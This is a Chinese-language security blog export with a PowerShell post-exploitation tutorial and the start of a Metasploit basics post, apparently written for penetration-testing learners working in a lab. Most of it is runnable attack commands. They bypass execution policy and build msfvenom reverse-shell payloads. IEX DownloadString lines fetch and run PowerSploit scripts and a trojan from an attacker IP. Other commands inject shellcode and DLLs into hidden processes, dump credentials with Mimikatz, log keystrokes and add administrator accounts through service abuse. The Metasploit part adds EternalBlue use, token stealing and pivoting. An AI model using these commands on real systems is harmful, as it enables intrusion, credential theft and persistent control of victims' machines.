alt="在这里插入图片描述"></p><ul><li>新建文件：<br><img src="https://img-blog.csdnimg.cn/20210430153034180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>删除目录</li></ul><p>Remove-Item<br><img src="https://img-blog.csdnimg.cn/20210430153107549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>显示文件内容</li></ul><p>Get-Content<br><img src="https://img-blog.csdnimg.cn/20210430153130243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>设置文件内容</li></ul><p>Set-Content<br><img src="https://img-blog.csdnimg.cn/20210430153159921.png" alt="在这里插入图片描述"></p><ul><li>追加内容</li></ul><p>Add-Content<br><img src="https://img-blog.csdnimg.cn/20210430153215415.png" alt="在这里插入图片描述"></p><ul><li>清除内容</li></ul><p>Clear-Content<br><img src="https://img-blog.csdnimg.cn/20210430153230800.png" alt="在这里插入图片描述"></p><h4 id="常用的命令："><a href="#常用的命令：" class="headerlink" title="常用的命令："></a>常用的命令：</h4><p>如果要运行powershell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted,所以在渗透时，就需要采用一些方法绕过策略来执行脚本</p><ul><li><p>绕过本地权限执行</p><p>上传xxx.ps1至目标服务器，在cmd环境下，在目标服务器本地执行该脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pow">PowerShell.exe -ExecutionPolicy Bypass  -File  xxx.ps1<br></code></pre></td></tr></table></figure></li><li><p>本地隐藏绕过权限执行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pow">PowerShell.exe -ExecutionPolicy Bypass  -WindowStyle Hidden  -NoLogo   -Nonlnteractive   -NoProfile  -File   xxx.ps1<br></code></pre></td></tr></table></figure></li><li><p>用IEX下载远程PS1脚本绕过权限执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs po">PowerShell.exe -ExecutionPolicy Bypass  -WindowStyle Hidden-NoProfile-NonIIEX(New-ObjectNet.WebClient).DownloadString(&quot;xxx.ps1&quot;);[Parameters]<br></code></pre></td></tr></table></figure></li></ul><h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><ul><li><p>-ExecutionPolicy Bypass </p><p>绕过执行安装策略，这个参数非常重要，在默认情况下，Powershell的安全策略规定了Powershell不允许运行命令和文件。通过设置这个参数，可以绕过一些安全保护规则，在渗透测试中，基本每一次运行powershell脚本都要使用这个参数</p></li><li><p>-WindowStyle Hidden </p><p>隐藏窗口</p></li><li><p>-NoLogo</p><p>启动不显示版权标志的Powershell</p></li><li><p>-Nonlnteractive( -Nonl)</p><p>非交互模式，powershell不为用户提供交互的提示</p></li><li><p>-NoProfile(-Nop)</p><p>powershell控制台不加载当前用户的配置文件</p></li><li><p>-Noexit</p><p>执行后不退出shell</p></li></ul><h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>‘“ test”‘&gt;t.ps1</p><p><img src="https://img-blog.csdnimg.cn/20210430153401145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit:"></a>PowerSploit:</h4><p>PowerSploit是一款基于Powershell的后渗透（post-Exploitation)框架软件，包含很多powershell攻击脚本，它们主要用户渗透中的信息侦察，权限提升，权限维持：</p><p>地址:    <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><h5 id="模块功能介绍："><a href="#模块功能介绍：" class="headerlink" title="模块功能介绍："></a>模块功能介绍：</h5><ul><li><p>AntivirusBypass</p><p>发现杀毒软件的查杀特征</p></li><li><p>CodeExecution</p><p>在目标主机上执行代码</p></li><li><p>Exfiltration</p><p>在目标主机上的信息收集工具</p></li><li><p>Mayhem</p><p>蓝屏等破坏性脚本</p></li><li><p>Persistence</p><p>后门脚本(持久性控制)</p></li><li><p>Recon</p><p>以目标主机为跳板进行内网信息侦察</p></li><li><p>ScriptModification</p><p>在目标主机上创建或修改脚本</p></li></ul><h2 id="PowershellSploit脚本攻击实战"><a href="#PowershellSploit脚本攻击实战" class="headerlink" title="PowershellSploit脚本攻击实战"></a>PowershellSploit脚本攻击实战</h2><p>攻击机为kali并且安装了powershellsploit</p><ul><li><h3 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h3>CodeExecution模块下的Invoke-Shellcode脚本常用于将shellcode插入指定的进程ID或本地Powershell中</li></ul><h4 id="直接执行shellcoe反弹meterpreter-shell"><a href="#直接执行shellcoe反弹meterpreter-shell" class="headerlink" title="直接执行shellcoe反弹meterpreter  shell"></a>直接执行shellcoe反弹meterpreter  shell</h4><ol><li><p>首先在msf中使用reverse_https模块进行反弹(监听)</p><pre><code class="hljs">   2.使用msfvenom命令生成一个Powershell脚本木马</code></pre></li></ol>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfvenom -p windows/meterpreter/reverse_https  LHOST=192.168.31.247  LPORT=4444  -f powershell  -o /var/www/html/test<br></code></pre></td></tr></table></figure><pre><code class="hljs">       3.接着在目标主机Powershell下输入以下命令下载该脚本(下载 invoke-shellcode)</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">      4.接着在目标主机上下载生成的木马</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">      5.在powershell中运行木马</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Shellcode -Shellcode  （<span class="hljs-variable">$buf</span>） -Force<br></code></pre></td></tr></table></figure><pre><code class="hljs">          -Force   意思是不用提示直接运行</code></pre><p>  ​</p><p><img src="https://img-blog.csdnimg.cn/20210430163754518.png" alt="在这里插入图片描述"><br>反弹回shell<br><img src="https://img-blog.csdnimg.cn/20210430164544353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>​ </p><p>  可以在msf中看到反弹shell成功</p><h4 id="指定进程注入shellcode反弹meterpreter-shell"><a href="#指定进程注入shellcode反弹meterpreter-shell" class="headerlink" title="指定进程注入shellcode反弹meterpreter shell"></a>指定进程注入shellcode反弹meterpreter shell</h4><pre><code class="hljs">         1.同样在目标机powershell下输入以下命令</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">          2.接着Get-Process命令或者PS命令查看当前进程              ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210430170657943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70)</code></pre><p>3.创建一个新进程，这里启动一个记事本，并把它设置为隐藏的，在输入Get-Process命令查看进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210430170805407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>4.接着输入命令，使用Invoke-Shellcode脚本进行注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Shellcode  -ProcessID  8120 -Shellcode(<span class="hljs-variable">$buf</span>)  -Force<br></code></pre></td></tr></table></figure><p>完成成功获取shell</p><ul><li><h3 id="Invoke-DLLInjection"><a href="#Invoke-DLLInjection" class="headerlink" title="Invoke-DLLInjection"></a>Invoke-DLLInjection</h3><p>下面使用Code Execution模块下的另一个脚本Invoke-DLLInjection，它是一个DLL注入的脚本</p><pre><code class="hljs">1.同理还是先下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-DLLIinjection.ps1&quot;</span>)<br>IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs"> 2.在kali中生成一个DLL注入脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.247  lport=4444  -f dll -o /var/www/html/test.dll<br></code></pre></td></tr></table></figure><pre><code class="hljs">   3.把生成的test.dll上传到目标服务器的C盘后，就能启动一个新的进程进行DLL注入，这样可以注入更加隐蔽，使用以下命令新建一个名为notepad.exe的隐藏进程</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Start-Process c:\windows\system32\notepad.exe-WindowStyle   Hidden<br></code></pre></td></tr></table></figure><pre><code class="hljs">    4.然后进行命令注入</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-DLLInjection  -ProcessID 2000 -DLL  c:\test.dll<br></code></pre></td></tr></table></figure><p>运行即可反弹shell</p></li></ul></li><li><h3 id="Invoke-Portscan"><a href="#Invoke-Portscan" class="headerlink" title="Invoke-Portscan"></a>Invoke-Portscan</h3><p>Invoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来比较简单。</p><pre><code class="hljs">                1.同样先使用以下命令下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Portscan.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">                2.使用以下命令进行扫描(目标机上)</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Portscan  -Hosts 192.168.31.1.192.168.31.247 -Port <span class="hljs-string">&quot;80,22,3389&quot;</span><br></code></pre></td></tr></table></figure></li><li><h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>Invoke-Mimikatz是Exfiltration模块下的一个脚本</p><pre><code class="hljs">                    1.同样使用命令下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Mimikatz.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">                    下载即可                    2.执行命令</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Mimikatz   -DumpCreds<br></code></pre></td></tr></table></figure></li></ul><h4 id="Get-Keystrokes"><a href="#Get-Keystrokes" class="headerlink" title="Get-Keystrokes:"></a>Get-Keystrokes:</h4><p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘记录，甚至记录鼠标的点击情况，还能记录详细的时间，实战时可以直接放入后台运行。</p><p>同样先使用以下命令下载脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/Exfiltration/Get-Keystores.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><p>使用以下命令开启键盘记录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-Keystrokes -LogPathc:\test1.txt<br></code></pre></td></tr></table></figure><h4 id="PowerUP攻击模块："><a href="#PowerUP攻击模块：" class="headerlink" title="PowerUP攻击模块："></a>PowerUP攻击模块：</h4><p>PowerUp是Privesc模块下的一个脚本，功能相当强大，拥有众多用来寻找目标主机windows服务漏洞进行提权的实用脚本。</p><p>加载模块：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">这里是本机所以直接导入<br>Import-Module  .\PowerUp.ps1<br><br>如要查看各个模块的详细说明，可以输入<br>get-help[cmdlet] -full<br>比如：<br>get-Help Invoke-ALLChecks   -full<br></code></pre></td></tr></table></figure><p>Invoke-ALLChecks:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">该模块会自动执行powerup下所以脚本啦检查目标主机，输出命令即可执行<br>Invoke-ALLChecks<br></code></pre></td></tr></table></figure><h4 id="Find-PathDLLHijack"><a href="#Find-PathDLLHijack" class="headerlink" title="Find-PathDLLHijack:"></a>Find-PathDLLHijack:</h4><p>该模块用于检查当前%PATH%的那些目录是用户可以写入的，输入以下命令即可执行该模块：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">Find</span>-Pathdllhijack<br></code></pre></td></tr></table></figure><h4 id="Get-RegistryAlwaysInstallElevated"><a href="#Get-RegistryAlwaysInstallElevated" class="headerlink" title="Get-RegistryAlwaysInstallElevated:"></a>Get-RegistryAlwaysInstallElevated:</h4><p>该模块用于检查AlwaysInstallElevated注册表项是否被设置，如果已被设置，意味着MSI文件以system权限运行的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><h4 id="Get-RegistryAutoLogon"><a href="#Get-RegistryAutoLogon" class="headerlink" title="Get-RegistryAutoLogon:"></a>Get-RegistryAutoLogon:</h4><p>该模块用于检查winlogin注册表的autoadminlogon项有没有被设置，可以查询默认的用户名和密码，执行该模块的命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-RegistryAutoLogon<br></code></pre></td></tr></table></figure><h4 id="Get-ServiceDetail"><a href="#Get-ServiceDetail" class="headerlink" title="Get-ServiceDetail:"></a>Get-ServiceDetail:</h4><p>该模块用于返回某服务的信息，输入以下命令即可执行该模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-ServiceDetail -ServiceName Dhcp                   <span class="hljs-comment">#获取DHCP服务的详细信息</span><br></code></pre></td></tr></table></figure><h4 id="Get-ServiceFilePermission"><a href="#Get-ServiceFilePermission" class="headerlink" title="Get-ServiceFilePermission:"></a>Get-ServiceFilePermission:</h4><p>该模块用于检查当前用户能够在那些服务的目录写入相关联的可执行文件，我们可以通过这些文件实现提权，输入以下命令即可执行该模块。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-ServiceFilePermission<br></code></pre></td></tr></table></figure><h4 id="Test-ServiceDaclPermission"><a href="#Test-ServiceDaclPermission" class="headerlink" title="Test-ServiceDaclPermission:"></a>Test-ServiceDaclPermission:</h4><p>该模块用于检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Test-ServiceDaclPerssion<br></code></pre></td></tr></table></figure><h4 id="Invoke-ServiceAbuse"><a href="#Invoke-ServiceAbuse" class="headerlink" title="Invoke-ServiceAbuse:"></a>Invoke-ServiceAbuse:</h4><p>该模块通过修改服务来添加用户到指定组，并可以通过设置-cmd参数触发添加用户的自定义命令，执行该模块的命令。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-ServiceAbuse -ServiceName VulnSVC    <span class="hljs-comment">#添加默认账号</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -UserName <span class="hljs-string">&quot;Test\john&quot;</span>     <span class="hljs-comment">#指定添加的域账户</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -UserName <span class="hljs-built_in">test</span>  -Password  password  -LocalGroup  <span class="hljs-string">&quot;Administrators&quot;</span>     <span class="hljs-comment">#指定添加用户，用户密码以及添加的用户组</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -Command <span class="hljs-string">&quot;net .......&quot;</span>         <span class="hljs-comment">#自定义执行命令</span><br></code></pre></td></tr></table></figure><h4 id="PowerUp攻击模块实战演练："><a href="#PowerUp攻击模块实战演练：" class="headerlink" title="PowerUp攻击模块实战演练："></a>PowerUp攻击模块实战演练：</h4><p>先加载PowerUp脚本，然后执行Invoke-ALLChecks，脚本将进行所有的检查</p><p>将powerup脚本上传至目标服务器，再从本地执行该脚本</p><p>使用IEX再内存中加载此脚本，执行以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">PowerShell.exe  -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;);Invoke-ALLChecks&quot;</span><br></code></pre></td></tr></table></figure><p>也可以再CMD环境下使用命令绕过执行该脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">powershell.exe  -<span class="hljs-built_in">exec</span> bypass -Command  <span class="hljs-string">&quot;&amp;&#123;Import-Module  .\PowerUp.ps1;  Invoke-ALLChecks&#125;&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>powershell基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf使用基础</title>
    <link href="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>msf是后渗透神奇，在kali中已经内置有。</p><p><strong>1.1 基础使用</strong><br>metasploit程序需要使用postgresql数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">手动启动数据库：<br><br>service postgresql start<br><br>设置成开机启动数据库：<br><br>systemctl <span class="hljs-built_in">enable</span> postgresql<br></code></pre></td></tr></table></figure><p>启动msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br></code></pre></td></tr></table></figure><p><strong>1.2.查找模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">search 模块名<br>//比如我要找永恒之蓝 search ms17_010<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503215820762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用那个模块 use 模块名或use 前面的数字都可以<br><img src="https://img-blog.csdnimg.cn/20210503215928377.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210503215943473.png" alt="在这里插入图片描述"><br><strong>1.3使用模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看要设置的参数</span><br>show options<br><span class="hljs-comment">#查看模块详情</span><br>info<br><span class="hljs-comment">#设置载荷  有很多可以自行选择</span><br> <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503220943666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503221039773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503221406503.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#运行模块</span><br>run 或者 exploit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503221232981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503221825545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>1.4.命令行模式的一些基础操作</strong><br>输入help可以查看支持的操作，但是乱码了，莫慌，可以解决。<br><img src="https://img-blog.csdnimg.cn/20210503221939621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入 chcp 65001<br><img src="https://img-blog.csdnimg.cn/20210503222042627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>乱码没有了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">核心后台脚本：<br><br>bgkill       关闭一个后台的meterpreter脚本<br><br>bglist   列出所有正在运行的后台脚本<br><br>bgrun   将一个meterpreter脚本以后台线程模式运行<br><br>channel   显示或者控制一个活动频道<br><br>close 关闭一个频道<br><br><span class="hljs-built_in">exit</span>终止meterpreter会话<br><br>get_timeouts获得当前会话的<span class="hljs-built_in">timeout</span>值<br><br>getuid查看当前权限<br><br><span class="hljs-built_in">help</span>帮助菜单<br><br>info 显示post模块信息<br><br>irb进入ruby脚本模式<br><br>load加载meterpreter扩展<br><br>migrate   将会话迁移到一个指定PID的进程<br><br>quit 结束meterpreter会话<br><br><span class="hljs-built_in">read</span>从频道中读取数据<br><br>resource运行文件中的命令<br><br>run 执行一个meterpreter脚本或者post模块<br><br>sessions    快速地切换到另一个会话<br><br>background切换到后台<br><br>run checkvm  查看是否是虚拟机<br><br>steal_token 伪造身份<br><br></code></pre></td></tr></table></figure><p>伪造身份：<br><img src="https://img-blog.csdnimg.cn/20210503222319828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.1实战演示</strong></p><p><img src="https://img-blog.csdnimg.cn/20210503223128117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>通过永恒之蓝拿到跳板机<br><img src="https://img-blog.csdnimg.cn/20210503223229837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>拿到跳板机之后添加路由<br><img src="https://img-blog.csdnimg.cn/20210503223357503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">添加攻击IP添加到目标机路由表中<br><br>也可以 run autoroute -s 10.10.10.0/24<br><br>或者手动添加<br><br>route add 10.10.10.0 255.255.255.0<br></code></pre></td></tr></table></figure><ul><li>接下来设置代理<br><img src="https://img-blog.csdnimg.cn/20210503223655707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" 